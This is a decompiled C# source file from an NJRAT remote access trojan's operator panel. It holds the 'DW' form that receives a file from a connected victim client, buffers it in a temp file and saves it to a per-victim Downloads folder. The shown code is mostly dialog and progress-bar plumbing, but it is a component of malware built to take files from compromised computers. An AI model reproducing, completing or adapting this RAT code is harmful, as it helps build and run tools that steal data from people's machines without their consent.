using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x02000010 RID: 16
	[DesignerGenerated]
	public partial class DW : Form
	{
		// Token: 0x06000152 RID: 338 RVA: 0x00151F48 File Offset: 0x00150348
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = DW.__ENCList;
			lock (_ENCList)
			{
				bool flag = DW.__ENCList.Count == DW.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = DW.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = DW.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								DW.__ENCList[num] = DW.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					DW.__ENCList.RemoveRange(num, DW.__ENCList.Count - num);
					DW.__ENCList.Capacity = DW.__ENCList.Count;
				}
				DW.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700007C RID: 124
		// (get) Token: 0x06000155 RID: 341 RVA: 0x001524AC File Offset: 0x001508AC
		// (set) Token: 0x06000156 RID: 342 RVA: 0x001524C4 File Offset: 0x001508C4
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x1700007D RID: 125
		// (get) Token: 0x06000157 RID: 343 RVA: 0x001524D0 File Offset: 0x001508D0
		// (set) Token: 0x06000158 RID: 344 RVA: 0x001524E8 File Offset: 0x001508E8
		internal virtual GClass9 Lv1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Lv1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Lv1 = value;
			}
		}

		// Token: 0x1700007E RID: 126
		// (get) Token: 0x06000159 RID: 345 RVA: 0x001524F4 File Offset: 0x001508F4
		// (set) Token: 0x0600015A RID: 346 RVA: 0x0015250C File Offset: 0x0015090C
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700007F RID: 127
		// (get) Token: 0x0600015B RID: 347 RVA: 0x0015256C File Offset: 0x0015096C
		// (set) Token: 0x0600015C RID: 348 RVA: 0x00152584 File Offset: 0x00150984
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= eventHandler;
				}
				this._Timer1 = value;
				flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick += eventHandler;
				}
			}
		}

		// Token: 0x17000080 RID: 128
		// (get) Token: 0x0600015D RID: 349 RVA: 0x001525E4 File Offset: 0x001509E4
		// (set) Token: 0x0600015E RID: 350 RVA: 0x001525FC File Offset: 0x001509FC
		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		// Token: 0x17000081 RID: 129
		// (get) Token: 0x0600015F RID: 351 RVA: 0x00152608 File Offset: 0x00150A08
		// (set) Token: 0x06000160 RID: 352 RVA: 0x00152620 File Offset: 0x00150A20
		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		// Token: 0x06000161 RID: 353 RVA: 0x0015262C File Offset: 0x00150A2C
		public DW()
		{
			base.Load += this.DW_Load;
			base.FormClosing += this.DW_FormClosing;
			DW.__ENCAddToList(this);
			this.os = 0;
			this.InitializeComponent();
		}

		// Token: 0x06000162 RID: 354 RVA: 0x00152680 File Offset: 0x00150A80
		private void DW_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.FS.Close();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.FS.Dispose();
			}
			catch (Exception ex2)
			{
			}
			try
			{
				File.Delete(this.tmp);
			}
			catch (Exception ex3)
			{
			}
			this.Button1.Enabled = false;
			this.c.CN = false;
		}

		// Token: 0x06000163 RID: 355 RVA: 0x00152730 File Offset: 0x00150B30
		private void DW_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)), " - ")), Class6.smethod_16(this.FN))));
			this.ProgressBar1.Maximum = this.SZ;
			this.folder = this.osk.Folder + "Downloads\\";
			bool flag = !Directory.Exists(this.folder);
			if (flag)
			{
				Directory.CreateDirectory(this.folder);
			}
			this.folder += new FileInfo(Class6.smethod_16(this.FN)).Name;
			this.Lv1.Items[0].SubItems[0].Text = new FileInfo(Class6.smethod_16(this.FN)).Name;
			this.Lv1.Items[1].SubItems[0].Text = Class6.smethod_17((long)this.SZ);
			do
			{
				this.tmp = Interaction.Environ("temp") + "\\njfm_" + Class6.smethod_6(10);
			}
			while (File.Exists(this.tmp));
			this.FS = new FileStream(this.tmp, FileMode.Append);
			this.Lv1.Items[2].SubItems[0].Text = Class6.smethod_17((long)(this.ProgressBar1.Value - this.os));
			this.os = this.ProgressBar1.Value;
			this.Lv1.Items[3].SubItems[0].Text = Class6.smethod_17((long)this.ProgressBar1.Value);
			this.Lv1.method_3();
			this.Timer1.Enabled = true;
		}

		// Token: 0x06000164 RID: 356 RVA: 0x00152938 File Offset: 0x00150D38
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				this.Lv1.Items[2].SubItems[1].Text = Class6.smethod_17((long)(this.ProgressBar1.Value - this.os));
				this.os = this.ProgressBar1.Value;
				this.Lv1.Items[3].SubItems[1].Text = Class6.smethod_17((long)this.ProgressBar1.Value);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000165 RID: 357 RVA: 0x001529E8 File Offset: 0x00150DE8
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Stop", false) == 0;
			if (flag)
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Delete(this.tmp);
				this.Button1.Enabled = false;
				this.c.CN = false;
				this.Close();
			}
			else
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Move(this.tmp, this.folder);
			}
		}

		// Token: 0x0400009F RID: 159
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040000A1 RID: 161
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x040000A2 RID: 162
		[AccessedThroughProperty("Lv1")]
		private GClass9 _Lv1;

		// Token: 0x040000A3 RID: 163
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x040000A4 RID: 164
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x040000A5 RID: 165
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		// Token: 0x040000A6 RID: 166
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		// Token: 0x040000A7 RID: 167
		public Client c;

		// Token: 0x040000A8 RID: 168
		public string FN;

		// Token: 0x040000A9 RID: 169
		public string folder;

		// Token: 0x040000AA RID: 170
		public FileStream FS;

		// Token: 0x040000AB RID: 171
		public int os;

		// Token: 0x040000AC RID: 172
		public Client osk;

		// Token: 0x040000AD RID: 173
		public int SZ;

		// Token: 0x040000AE RID: 174
		public string tmp;
	}
}
